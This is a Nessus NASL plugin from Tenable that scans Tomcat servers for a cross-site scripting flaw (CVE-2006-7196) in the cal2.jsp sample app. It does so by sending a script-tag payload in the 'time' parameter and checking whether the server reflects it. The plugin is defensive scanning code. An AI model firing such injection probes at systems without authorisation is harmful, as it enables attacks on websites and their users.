#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(26070);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-7196");
  script_bugtraq_id(25531);
  script_xref(name:"OSVDB", value:"34888");

  script_name(english:"Tomcat Sample App cal2.jsp time Parameter XSS (CVE-2006-7196)");
  script_summary(english:"Checks for an XSS flaw in Tomcat's cal2.jsp");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a JSP application that is affected by a
cross-site scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote web server includes an example JSP application, 'cal2.jsp',
that fails to sanitize user-supplied input before using it to generate
dynamic content.  An unauthenticated remote attacker may be able to
leverage this issue to inject arbitrary HTML or script code into a
user's browser to be executed within the security context of the
affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/478491/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/478609/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Either undeploy the Tomcat examples web application or upgrade to
Tomcat 4.1.32 / 5.5.16 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default: 8080);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);


# Unless we're paranoid, make sure the banner looks like Tomcat.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Apache-Coyote" >!< banner) exit(0);
}


# Send a request to exploit the flaw.
time = "8am";
xss = raw_string("<script>alert(", SCRIPT_NAME, ")</script>");

foreach dir (make_list("/examples/jsp", "/jsp-examples"))
{
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/cal/cal2.jsp?",
      "time=", time, urlencode(str:xss)
    ), 
    port:port  
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w [2];

  # There's a problem if our exploit appears along with the time in a form.
  if (
    "METHOD=POST ACTION=cal1.jsp" >< res &&
    string('INPUT NAME="time" TYPE=HIDDEN VALUE=',time, xss) >< res
  )
  {
   security_warning(port);
   set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  }
}
